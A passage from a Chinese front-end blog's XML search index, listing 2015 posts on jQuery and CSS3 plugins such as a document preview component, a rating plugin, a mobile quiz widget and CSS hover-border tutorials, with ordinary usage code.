        <tag>移动端适配</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[纯CSS3鼠标悬浮图片动画效果 - Animatia]]></title>
    <url>%2F2015%2F07%2F23%2F%E7%BA%AFcss3%E9%BC%A0%E6%A0%87%E6%82%AC%E6%B5%AE%E5%9B%BE%E7%89%87%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C-animatia%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;这个插件的目的是提供优质的悬浮动画效果，可以使用他们在您的web项目和提高用户的web体验。Animatia包含不同类型的设计像按钮样式,覆盖效果,图像效果,说明文字。Demo演示点此下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>Animatia</tag>
        <tag>css3鼠标悬浮</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Word，PPT 文档预览js组件（图片预览js组件）]]></title>
    <url>%2F2015%2F07%2F23%2Fword%EF%BC%8Cppt-%E6%96%87%E6%A1%A3%E9%A2%84%E8%A7%88js%E7%BB%84%E4%BB%B6%EF%BC%88%E5%9B%BE%E7%89%87%E9%A2%84%E8%A7%88js%E7%BB%84%E4%BB%B6%EF%BC%89%2F</url>
    <content type="text"><![CDATA[插件说明此插件需要由服务端提供转换好的Word图片或PPT图片来进行预览。插件需要 jQuery1.9+ 库。支持IE7+，FireFox，Chrome。初始化调用插件的外容器，只需设置宽高样式即可，无需其它设置。因插件是刚开始阶段，一些功能并未能完善全，如：放大，缩小功能。插件中一些滚动的计算是硬算出来的(勿喷)。插件特性服务端将全数据返回(图像地址的数组集合)，由插件进行分割加载。支持滚动条拖拽滚动及全屏预览。支持上一页，下一页功能。目录结构说明12345678910111213141516171819MPreview/├── css/│ ├── base.css (重置样式)│ └── MPreview.css (插件所需样式)├── images/│ ├── loading.gif (加载图片等待动画)│ └── media_icon.png (插件所需的icon)├── js/│ ├── MPreview.js (Word版 js)│ └── MPreviewPPT.js (PPT版 js)├── upload/│ ├── MPreview_DOC_1.jpg (测试图片)│ └── MPreview_PPT_1.jpg├── api.php (数据请求的演示地址)├── data.json (请求所返回的数据格式)├── index.html (Word版 Demo)└── PPT.html (PPT版 Demo)PS: 务必一次性返回所有图片地址，插件将自动分割加载如何使用123456789101112&lt;!-- require css --&gt;&lt;link rel="stylesheet" href="css/MPreview.css"&gt;&lt;!-- require js --&gt;&lt;script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/1.11.1/jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/MPreview.js"&gt;&lt;/script&gt;&lt;!-- html --&gt;&lt;div class="doc" id="doc"&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt; $('#doc').MPreview(&#123; url: 'api.php?action=doc&amp;amp;callback=?' &#125;);&lt;/script&gt;MPreview.js (Word 版) 参数说明123456789101112$('#doc').MPreview(&#123;url: 'api.php?action=doc&amp;amp;callback=?', //url中包含callback则表示跨越请求，具体可参考$.getJSON();data: null, //包含所有图片地址的数组，如填写则不发送Ajax。用于直接传入数据，方便调用。offset: 100, //每次滚动偏移多少像素，默认 100pxloadSize: 5, //每次加载几张图片pageFix: 50, //当前页数判定的衡量标准scrollFix: 5, //当前默认滚动条距离外容器的边距minScrollHeight: 20 //当前滚动条按钮最小高度&#125;);//关于 data 参数的用法var data = ['upload/1.jpg','upload/2.jpg','upload/3.jpg'];$('#doc').MPreview(&#123; data: data &#125;);MPreviewPPT.js (PPT 版) 参数说明1234567891011$('#ppt').MPreviewPPT(&#123;url: 'api.php?action=doc&amp;amp;callback=?', //url中包含callback则表示跨越请求，具体可参考$.getJSON();data: null, //包含所有图片地址的数组，如填写则不发送Ajax。用于直接传入数据，方便调用。loadSize: 5, //每次加载几张图片scrollFix: 5, //当前默认滚动条距离外容器的边距minScrollHeight: 20 //当前滚动条按钮最小高度&#125;);//关于 data 参数的用法var data = ['upload/1.jpg','upload/2.jpg','upload/3.jpg'];$('#ppt').MPreviewPPT(&#123; data: data &#125;);Demo演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>js文档预览</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端在线做题组件]]></title>
    <url>%2F2015%2F07%2F23%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%9C%A8%E7%BA%BF%E5%81%9A%E9%A2%98%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[移动端在线做题组件mexam.js，现只支持单选，多选，判断题类型。Demo 预览 (扫一扫)&nbsp;插件说明插件依赖 Zepto，需要以下模块Core, event, touch, fx；组件中的 js/zepto.min.js 已包含需要的模块，无需添加模块。组件支持 AMD, CMD，加载方式，模块名为 Mexam;兼容性 Android 4.4+, iOS 8.0+ 下的自带浏览器测试能过。强调只支持单选，多选，判断题类型。增加答题卡页面。题目类型 type 字段说明 1为单选，2为多选，4为判断。如何使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;!-- Load Mexam CSS &amp;amp;&amp;amp; JS --&gt;&lt;link rel="stylesheet" type="text/css" href="css/Mexam.css"/&gt;&lt;script type="text/javascript" src="js/zepto.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/Mexam.js"&gt;&lt;/script&gt;&lt;!-- 用于显示组件的容器 --&gt;&lt;div class="overlay" id="overlay"&gt;&lt;/div&gt;&lt;!-- 初始化 --&gt;&lt;script type="text/javascript"&gt;var data = [ &#123; id: "i88bac6k8yra-9bwr-04fq", title: "单选题题目", type: 1, content: [ "选项A", "选项B", "选项C", "选项D", ] &#125;, &#123; id: "i88bac6k8yra-9bwr-04fq", title: "多选题题目", type: 2, content: [ "选项A", "选项B", "选项C", "选项D", "选项E", "选项F", "选项G", "选项H", "选项J", ] &#125;, &#123; id: "i88bac6k8yra-9bwr-04fq", title: "判断题题目", type: 4, content: [ "选项A", "选项B", "选项C", "选项D", ] &#125;,];Mexam(&#123; title: 'Mexam 移动端在线做题', data: data, wrap: '#overlay',&#125;);&lt;/script&gt;点击下载]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端在线做题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[仿云盘拖拽上传插件：DragUpload]]></title>
    <url>%2F2015%2F07%2F23%2F%E4%BB%BF%E4%BA%91%E7%9B%98%E6%8B%96%E6%8B%BD%E4%B8%8A%E4%BC%A0%E6%8F%92%E4%BB%B6%EF%BC%9Adragupload%2F</url>
    <content type="text"><![CDATA[功能点实现1. 拖拽文件至浏览器窗口上传2. 批量上传多文件3. 多文件队列发送操作4. 上传进度条5. 上传前，上传成功，上传错误回调方法6. 友好的APIDemo演示说明1. 因是个人空间，所以所有上传数据为假，只是返回JSON数据2. 上传前也做了限制，只能上传图片格式，大小不超过512KB3. 因涉及HTML5 的事件，所以你懂的，只支持现代浏览器4. Bug 的问题肯定少不了，所以有待继续优化5. 个人学习项目，有问题请到Blog留言6. 下载（上传无任何限制，包含服务端代码），请戳 [这里]&nbsp;Demo演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>云盘拖拽上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详解强大的jquery评分插件jquery.raty]]></title>
    <url>%2F2015%2F07%2F23%2F%E8%AF%A6%E8%A7%A3%E5%BC%BA%E5%A4%A7%E7%9A%84jquery%E8%AF%84%E5%88%86%E6%8F%92%E4%BB%B6jquery-raty%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;这是一款功能强大的jquery评分插件**jquery.raty，可灵活设置33个参数，可以显示数值和自定义字符串数组，比以往分享的星级评分插件功能强多了，使用也比较简单，最简单的使用初始化jquery**代码就一行$(”#star“).raty();，具体的大家自己下载下来慢慢看吧。。。&emsp;&emsp;使用方法很简单，首先下载raty的源代码（依赖于jquery），然后在页面中引入相应的js文件、css文件、图片资源，在需要添加评分组件的元素上（比如span标签）添加下面的jquery代码即可：1javascript$(&lt;span class=&quot;hljs-string&quot;&gt;&apos;span&apos;&lt;/span&gt;).raty();以上为jQuery Raty的缺省使用方法，此外，该组件还支持丰富的传入参数和回调函数，例如：设置jQuery Raty的初始评分：1、评分回调函数：如果需要根据后台动态设置初始评分，可以使用回调函数实现。例如使用div中的data-attribute属性：123&lt;div data-score="1"&gt;&lt;/div&gt;$('div').raty(&#123; score: function() &#123; return $(this).attr('data-score'); &#125; &#125;);还可以改变星星的个数：1$('div').raty(&#123; number: 10 &#125;);2、只读模式：1$('div').raty(&#123; readOnly: true, score: 3 &#125;);3、点击事件：1$('div').raty(&#123; click: function(score, evt) &#123; alert('ID: ' + this.id + "\nscore: " + score + "\nevent: " + evt); &#125; &#125;);4、路径：变更图标保存的位置，所有图标需要位于同一目录下，路径结尾的/不添加也可以123&lt;div data-path="assets/images"&gt;&lt;/div&gt;$('div').raty(&#123; path: function() &#123; return this.getAttribute('data-path'); &#125; &#125;);5、取消评分：1$('div').raty(&#123; cancel: true &#125;);6、全局改变设置：&emsp;&emsp;你可以全局更改上述提到的所有设置 $.fn.raty.defaults.OPTION = VALUE;. 该语句必须添加在插件绑定之前。123$.fn.raty.defaults.path = assets;$.fn.raty.defaults.cancel = true;7、参数列表：12345678910111213141516171819202122232425262728293031323334cancel : false // Creates a cancel button to cancel the rating.cancelClass : 'raty-cancel' // Name of cancel's class.cancelHint : 'Cancel this rating!' // The cancel's button hint.cancelOff : 'cancel-off.png' // Icon used on active cancel.cancelOn : 'cancel-on.png' // Icon used inactive cancel.cancelPlace : 'left' // Cancel's button position.click : undefined // Callback executed on rating click.half : false // Enables half star selection.halfShow : true // Enables half star display.hints : ['bad', 'poor', 'regular', 'good', 'gorgeous'] // Hints used on each star.iconRange : undefined // Object list with position and icon on and off to do a mixed icons.mouseout : undefined // Callback executed on mouseout.mouseover : undefined // Callback executed on mouseover.noRatedMsg : 'Not rated yet!' // Hint for no rated elements when it's readOnly.number : 5 // Number of stars that will be presented.numberMax : 20 // Max of star the option number can creates.path : undefined // A global locate where the icon will be looked.precision : false // Enables the selection of a precision score.readOnly : false // Turns the rating read-only.round : &#123; down: .25, full: .6, up: .76 &#125; // Included values attributes to do the score round math.score : undefined // Initial rating.scoreName : 'score' // Name of the hidden field that holds the score value.single : false // Enables just a single star selection.space : true // Puts space between the icons.starHalf : 'star-half.png' // The name of the half star image.starOff : 'star-off.png' // Name of the star image off.starOn : 'star-on.png' // Name of the star image on.target : undefined // Element selector where the score will be displayed.targetFormat: '&#123;score&#125;' // Template to interpolate the score in.targetKeep : false // If the last rating value will be keeped after mouseout.targetScore : undefined // Element selector where the score will be filled, instead of creating a new hidden field (scoreName option).targetText : '' // Default text setted on target.targetType : 'hint' // Option to choose if target will receive hint o 'score' type.starType : 'img' // Element used to represent a star.8、回调函数列表：1234567891011121314151617$('div').raty('score'); // Get the current score.$('div').raty('score', number); // Set the score.$('div').raty('click', number); // Click on some star.$('div').raty('readOnly', boolean); // Change the read-only state.$('div').raty('cancel', boolean); // Cancel the rating. The last param force the click callback.$('div').raty('reload'); // Reload the rating with the current configuration.$('div').raty('set', &#123; option: value &#125;); // Reset the rating with new configurations.$('div').raty('destroy'); // Destroy the bind and give you the raw element.$('div').raty('move', number); // Move the mouse to the given score point position.Demo演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jquery.raty</tag>
        <tag>jquery.raty使用方法</tag>
        <tag>jquery.raty参数</tag>
        <tag>评分插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery手机移动端触屏日历日期选择]]></title>
    <url>%2F2015%2F07%2F23%2Fjquery%E6%89%8B%E6%9C%BA%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%A7%A6%E5%B1%8F%E6%97%A5%E5%8E%86%E6%97%A5%E6%9C%9F%E9%80%89%E6%8B%A9%2F</url>
    <content type="text"><![CDATA[特效说明：jQuery手机移动端触屏日历日期选择网页特效免费下载，该特效代码是一款依赖于iScroll滑动组件，样式不附加任何图片，日期精确到了小时和分钟，能自动定位到当前系统时间。请用支持HTML5+CSS3主流浏览器预览效果。（兼容测试：FireFox、Chrome、Safari、Opera等支持HTML5/CSS3浏览器）使用方法：1、调用CSS样式：1&lt;link href="css/common.css" rel="stylesheet" type="text/css" /&gt;2、调用JS插件代码：123&lt;script type="text/javascript" src="js/jquery-1.9.1.js" &gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/date.js" &gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/iscroll.js" &gt;&lt;/script&gt;3、添加HTML代码：将……之间的html和js代码；放在&lt;body&gt;&lt;/body&gt;之间。&nbsp;Demo演示点击下载&nbsp;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端日期控件</tag>
        <tag>触屏日历</tag>
        <tag>触屏日期控件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[鼠标在banner图上移动图片跟随动态移动]]></title>
    <url>%2F2015%2F07%2F23%2F%E9%BC%A0%E6%A0%87banner%E5%9B%BE%E4%B8%8A%E7%A7%BB%E5%8A%A8%E5%9B%BE%E7%89%87%E8%B7%9F%E9%9A%8F%E5%8A%A8%E6%80%81%E7%A7%BB%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[特效说明：&emsp;&emsp;一款鼠标banner图上移动图片跟随动态移动网页特效，酷炫Banenr图片展示免费JS特效代码素材下载。（兼容测试：IE7及以上、Firefox、Chrome、Opera、Safari、360等主流浏览器）使用方法：1、调用CSS样式：1&lt;link rel="stylesheet" type="text/css" href="css/style.css" /&gt;2、调用JS插件代码：12&lt;script type="text/javascript" src="js/jquery.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/jquery.smart3d.js"&gt;&lt;/script&gt;3、添加HTML代码：将……之间的html和js代码；放在之间。4、初始化JS代码：123456&lt;script type="text/javascript"&gt;$(function() &#123;$('#mindscape').smart3d(850);$('#monsteck_variketch').smart3d(850);&#125;);&lt;/script&gt;Demo演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>鼠标移动图片移动</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 语言基础知识点总结（思维导图）]]></title>
    <url>%2F2015%2F07%2F23%2Fjavascript-%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%88%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、DOM操作基础2、javascript数组3、javascript函数基础4、javascript运算符5、javascript流程语句6、javascript正则表达式7、javascript字符串函数8、javascript数据类型9、javascript变量10、window对象]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js基础总结</tag>
        <tag>js思维导图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自定义Select插件]]></title>
    <url>%2F2015%2F07%2F22%2F%E8%87%AA%E5%AE%9A%E4%B9%89select%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[怎么自定义select下拉选择框的样式，使用纯CSS实现，把浏览器默认的样式覆盖掉还是有其他的方法，select靠纯CSS是不能解决这个自定义样式问题，下面分享一下本人使用select自定义的案例；Demo演示点此下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>自定义select</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源jQuery插件快速构建单页网站]]></title>
    <url>%2F2015%2F07%2F18%2F%E5%BC%80%E6%BA%90jquery%E6%8F%92%E4%BB%B6%E5%BF%AB%E9%80%9F%E6%9E%84%E5%BB%BA%E5%8D%95%E9%A1%B5%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;单页网站将成为网站设计的主要趋势之一。其将设计元素减为最少，将访问者关心的核心内容放在最显眼位置，提高了网站效率。有一些jQuery插件可大大提高单页网站的开发效率，如Single Page Nav、Ascensor.js等。&emsp;&emsp;单一页面网站（单一页面网站设计）是现代网站设计的主要趋势之一。单一页面网站布局将导航、设计元素减为最少，专注于访问者所关心的网站内容。此外，它还显著提高了网站的效率，允许你将核心内容放在最显眼位置。因为脚本技术（如Ajax和jQuery）已十分稳定、成熟且广泛应用，单一页面网站的开发已变得十分简单。&emsp;&emsp;本文将列举一些此类的工具与插件，你可以利用它们开发出漂亮的单一页面网站。1、jQuery Scroll Path演示DemoGitHub下载地址&emsp;&emsp;jQuery Scroll Path为jQuery滚动路径插件，可以让你自定义滚动路径。这是一个非常新颖的插件。借助它，你可以绘制出任何尺寸的滚动路径（利用curves）。HTML元素沿路径进行布局。可通过鼠标滚轮的上下滚动，向上/下光标键及空格键，来动画显示路径中的每个元素。&emsp;&emsp;此外，它还包含一个定制的滚动条，可通过单击与拖拽实现滚动。同时，该插件利用CSS转换（CSS Transform）实现了整个页面的旋转。2、Ascensor.js演示DemoGitHub下载地址&emsp;&emsp;Ascensor所实现的效果十分新颖，你可以用四个方向键来控制网页内容的移动。构建该插件，主要为了实现在同一页面Div元素之间产生视觉错位幻灯效果。Ascensor利用页面一角的小导航系统可对页面进行水平与垂直方向的滚动。这是比其他插件独特的地方。如果该类型插件适合你的网站，那它将是一个非常不错的选择。此插件可定制性很高，可以设定是否启用方向键控制，是否显示导航等等。3、jQuery Waypoints演示DemoGitHub下载地址&emsp;&emsp;Cool Kitten 是一个具备视差滚动特效的开源响应式框架，由Jalxob编写，为Github上的开源项目。该插件实现了网站在智能手机、平板、电脑上的响应式显示，支持视差滚动（Parallax Scrolling）特效，给网站带来绚丽的视觉效果。它多被描述为包含大量HTML/CSS（像Normalize.css）资源的框架。4、Curtain.js演示DemoGitHub下载地址&emsp;&emsp;这个插件允许你创建一个包含多个固定块的网页，并实现了有趣的展开效果，酷似帷幕上升。虽然Curtain.js现在已经停止维护，但它仍为构建单一页面布局提供了良好的开始。每个面板被横向分隔开，当用户向下滚动页面时，下面的面板如揭幕般展示出来。5、SMINT演示Demo下载地址&emsp;&emsp;该jQuery插件更加简单，同时也支持自然的滑动效果。SMINT代表“Sticky Menu Including Navigation Thingy”。视差滚动效果是它的另一特点，将导航菜单固定在页面顶部十分有利于界面设计。SMINT插件还提供了十分精彩的文档，为开发者提供了大量的定制功能。6、Skrollr演示DemoGitHub下载地址&emsp;&emsp;Skrollr是另一款单页面视差滚动JavaScript框架。开发者可利用CSS3转换（CSS3 Transition）、jQuery Easing函数为新元素定义动画。它是不依赖于其它框架的独立类库，可帮你快速打造视差滚动效果。它可以给任意元素设置关键帧的CSS属性，并自动形成动画效果。更重要的一点是，使用此类库时不用写复杂的JavaScript代码，对于那些不太熟悉JavaScript的设计师来说是个极大的便利。该库经Gzip 压缩后只有3KB。7、Single Page Nav演示DemoGitHub下载地址&emsp;&emsp;Single Page Nav允许你创建固定位置的导航面板，同时可高亮显示当前处于活动状态的菜单项。其代码文档简单明了，所有功能均构建于jQuery Easing函数之上。强烈推荐大家使用。8、jQuery One Page NavGitHub下载地址&emsp;&emsp;该插件与Single Page Nav十分相似，虽然它发布在先。相比之下，该脚本更加简单明了，对于那些喜欢从简单入手的开发者来说，这是一个很好的选择。jQuery One Page Nav同样支持固定位置的导航及高亮显示当前选择的表单项。如果你在使用Single Page Nav的过程中遇到了困难，可以尝试一下jQuery One Page Nav。9、jQuery Parallax演示DemoGitHub下载地址&emsp;&emsp;jQuery Parallax用来创建包含不同内容、垂直滚动的面板。如果希望展示特定类型的数据、图片，该插件将十分有用。该Demo用包含不同背景的文字块来区分不同的内容部分。jQuery Parallax可用来构建垂直滚动、具有相似设计风格的Web页面。如何独自设计出如此风格的网站，开发者Ian Lunn提供了一个简单的教程。10、Single.jsGitHub下载地址Single.js与jQuery&emsp;&emsp;Parallax有相似之处，同时还具有自己的特性。利用它，你可以构建向前/向后链接，从而在不同的内容面板间进行切换。为了满足响应式设计布局与Retina设备，该插件还支持可改变大小的图片。该插件还没有Demo可观察，你可以从Github中下载源代码，自己运行观看一下。Single.js是构建包含不同内容模块、垂直滚动页面的另一不错的选择。11、JustaPage演示Demo&emsp;&emsp;JustaPage已超出了插件范畴，它是设计单一页面网站的模板。该模板具有跨浏览器特性，同时对移动友好。12、 jQuery.SnapScroll演示DemoGitHub下载地址&emsp;&emsp;该插件虽然不提供完全的视差滚动效果，但如果你的设计专注于垂直展示的内容，它就有用。当用户向下滚动页面时，SnapScroll可自动将接下来要展示的内容块自动提升到屏幕最上端。你需要自己设计所有的内容部分，利用CSS来设计样式以适应屏幕的尺寸。在设计移动应用时，如果内容通过自动锁定特性（auto-locking feature）被突出显示时，SnapScroll是最合适的选择。13、jQuery. ScrollToGitHub下载地址&emsp;&emsp;利用该插件，你可以很容易地滚动溢出元素和屏幕本身。它给了开发者很多不同的定制选择，并提供了各种滚动方法。（编译：陈秋歌 审校：张红月）]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq插件单页网站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS伪元素before、after妙用：制作时尚焦点图相框]]></title>
    <url>%2F2015%2F07%2F18%2Fcss%E4%BC%AA%E5%85%83%E7%B4%A0before%E3%80%81after%E5%A6%99%E7%94%A8%EF%BC%9A%E5%88%B6%E4%BD%9C%E6%97%B6%E5%B0%9A%E7%84%A6%E7%82%B9%E5%9B%BE%E7%9B%B8%E6%A1%86%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在css标签中有这样子的标签div:before、div:after，对于before、after来说有部分人是相当陌生的，那么这两个标签是什么呢？有什么用处？:befor、:after是CSS的伪元素，什么是伪元素呢？伪元素用于向某些选择器设置特殊效果。我们用CSS手册可以查询到其基本的用法：:before/::before 设置在对象前（依据对象树的逻辑结构）发生的内容。用来和content属性一起使用:after/::after 设置在对象后（依据对象树的逻辑结构）发生的内容。用来和content属性一起使用Ie6-7 不支持既然说到了before、after，那么我们也要大概的了解下content，content用来和:after及:before伪元素一起使用，在对象前或后显示内容。基本的用法如下：1234567891011121314151617181920212223242526272829现在我们大概知道before和after的大概用法了，那么我们就可以在元素的内容之前或者之后插入新内容。而插入的内容我们也可以用css样式来加以控制和美化。也许在平常中这样子的标签用处不大，但是存在即是真理，哈哈，肯定有他的妙用之处，今天就来看看利用before和after制作的一个创意的时尚焦点图相框，以后制作这种边框线的时候我们可以完全抛弃图片的做法，而且做出来的非常的精美。### 制作思路以及方法：1、 在图片层加多一层div，设置1像素的边框线，边框线有上下左右四条边框，而我们想要的只是每两条边框线组成的类似小三角形的形状，那么我们只要把四条边框线的中间部分去掉，那不就实现了我们的效果。那我们应该怎么把四条边框线中间部分去掉？或者用什么东西把他盖住，不让他显示出来？解决办法就是，我们知道before和after伪元素可以在元素之前或者之后添加新的内容，那我们就利用这两个伪元素来盖住四条边框线的中间部分。2、 我们先去掉左右两边的边框线，在边框层，利用before伪元素，使用css样式的定位，设置白色边框，为什么要白色的边框呢？因为要把之前的左右边框中间部分遮掉，颜色设置成和背景色（本例的背景为白色背景）一致，这样子看起来就相当于中间部分被裁剪掉了。3、我们继续去掉上下两条边框线，方法同上，利用after伪元素，使用css样式的定位，设置为白色边框，遮掉上下边框线的中间部分。这样子一来，基本的形状就出现了4、美化步骤，调整我们的细节，边框线调整为虚线。了解了基本的思路和方法，是不是很简单呢？那我们就开始动手写代码吧。### HTML代码：```html&lt;div class=&quot;content&quot;&gt;&lt;ul&gt; &lt;li&gt;&lt;a href=&quot;http://www.npm8.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;jiawin_1.jpg&quot; /&gt; &lt;p class=&quot;focus&quot;&gt;&lt;/p&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;http://www.npm8.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;jiawin_2.jpg&quot; /&gt; &lt;p class=&quot;focus&quot;&gt;&lt;/p&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;http://www.npm8.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;jiawin_3.jpg&quot; /&gt; &lt;p class=&quot;focus&quot;&gt;&lt;/p&gt;&lt;/a&gt;&lt;/li&gt; &lt;li id=&quot;noborder&quot;&gt;&lt;a href=&quot;http://www.npm8.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;jiawin_4.jpg&quot; /&gt; &lt;p class=&quot;focus&quot;&gt;&lt;/p&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;CSS样式代码1234567.content &#123;width:788px; margin:auto; height:auto; overflow:hidden; padding:30px; &#125;.content ul li &#123;float:left; height:176px; border-right:1px solid #DDDDDD; position:relative; padding:10px;&#125;.focus &#123;background:rgba(250,250,250,0.25); width:174px; height:174px; border:1px dashed #666; position:absolute; left:10px; top:10px; display:none;&#125;.focus:before &#123;width:174px; height:134px; border-left:1px solid #fff; border-right:1px solid #fff; content:''; position:absolute; left:-1px; top:20px;&#125;.focus:after &#123;width:134px; height:174px; border-top:1px solid #fff; border-bottom:1px solid #fff; content:''; position:absolute; top:-1px; left:20px;&#125;.content ul li:hover .focus &#123;display:block;&#125;#noborder &#123;border-right:0 none;&#125;&emsp;&emsp;通过这个例子是不是很方便的把这个效果做出来了呢？而且看看我们的代码，是不是很简洁呢！哈哈……或许还有更好的方法来实现，我们可以一起探讨。我个人感觉其实div+css是很好的一门很容易手上但是功能性很强的技术，而且他很好玩很有趣。利用你的奇思妙想， 你可以做出各种意想不到的效果。期待你的作品哦。DEMO演示点此下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css after</tag>
        <tag>css before</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3动画条纹边框]]></title>
    <url>%2F2015%2F07%2F18%2Fcss3%E5%8A%A8%E7%94%BB%E6%9D%A1%E7%BA%B9%E8%BE%B9%E6%A1%86%2F</url>
    <content type="text"><![CDATA[DEMO演示点此下载先简单的说一下实现原理，大家都可以通过demo看到最终的效果，当鼠标停留在图片上面时，图片的边框就会出现带有斜度的条纹背景（暂且不管动画）， 看下源代码就能明白其中的原理，首先用样式制作出条纹背景，设置opacity值为0，在鼠标经过图片所在的层是再将opacity改为1并且中间设置个过渡时间，这样子条纹背景图就能缓慢的出现以及消失，这个原理是比较简单的。下面就为大家介绍下CSS3动画条纹边框的制作以及代码的编写。HTML结构首先是HTML结构的编写，仔细分析一下demo的效果，结构应该是比较简单的，只需要两层元素即可。其实我们可以利用《 CSS伪元素before、after妙用：制作时尚焦点图相框》一文中的伪元素::before来处理条纹背景，但考虑浏览器兼容性原因以及这一次想换个方式来输出实现，只要额外添加一个&lt;div&gt;即可。例如：12&lt;div class="product-hover"&gt;&lt;/div&gt;&lt;img src="images/1.jpg"&gt;如果结构是这样子编写的话，那条纹背景将是一个层，而图片也是一个层，所以要注意的是，条纹形状不是图片的边框， 而是另外一个层的显示效果，只是叠加到了图片下面，所以看起来像是图片的边框。在本例中的HTML具体代码如下：12345678910111213141516&lt;div class="main"&gt;&lt;ul&gt;&lt;li class="product"&gt; &lt;div class="product-hover"&gt;&lt;/div&gt; &lt;img src="images/1.jpg"&gt;&lt;/li&gt;&lt;li class="product"&gt; &lt;div class="product-hover"&gt;&lt;/div&gt; &lt;img src="images/2.jpg"&gt;&lt;/li&gt;&lt;li class="product"&gt; &lt;div class="product-hover"&gt;&lt;/div&gt; &lt;img src="images/3.jpg"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;定义CSS样式接下来我们一起来看看怎么定义样式。在一个盒模型里面，我们需要预留padding: 15px;，用来作为显示条纹形式的区域。123456.product &#123; width: 376px; padding: 15px; position: relative; float: left;&#125;然后是条纹形状的制作以及动画的实现：123456789101112131415161718192021222324252627282930313233343536373839404142.product-hover &#123; position: absolute; top: 0; left: 0; right: 0; bottom: 0; opacity: 0; -webkit-transition: opacity 0.3s ease; -moz-transition: opacity 0.3s ease; transition: opacity 0.3s ease; background-size: 30px 30px; background-image: -webkit-linear-gradient(45deg, rgba(0, 0, 0, 0.2) 25%, transparent 25%, transparent 50%, rgba(0, 0, 0, 0.2) 50%, rgba(0, 0, 0, 0.2) 75%, transparent 75%, transparent); background-image: -moz-linear-gradient(45deg, rgba(0, 0, 0, 0.2) 25%, transparent 25%, transparent 50%, rgba(0, 0, 0, 0.2) 50%, rgba(0, 0, 0, 0.2) 75%, transparent 75%, transparent); background-image: linear-gradient(45deg, rgba(0, 0, 0, 0.2) 25%, transparent 25%, transparent 50%, rgba(0, 0, 0, 0.2) 50%, rgba(0, 0, 0, 0.2) 75%, transparent 75%, transparent); -webkit-animation: barberpole 0.5s linear infinite; -moz-animation: barberpole 0.5s linear infinite; animation: barberpole 0.5s linear infinite;&#125; @-webkit-keyframes barberpole &#123; from &#123; background-position: 0 0;&#125;to &#123; background-position: 60px 30px;&#125;&#125;@-moz-keyframes barberpole &#123; from &#123; background-position: 0 0;&#125;to &#123; background-position: 60px 30px;&#125;&#125;@keyframes barberpole &#123; from &#123; background-position: 0 0;&#125;to &#123; background-position: 60px 30px;&#125;&#125;最后是鼠标经过图片是，显示条纹形状：123.product:hover .product-hover, .product:active .product-hover &#123; opacity: 1;&#125;其主要的代码就是这些了，如果要查看完整的css代码，可下载附件查阅。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>CSS3动画边框</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动web前端开发常见问题解决方案]]></title>
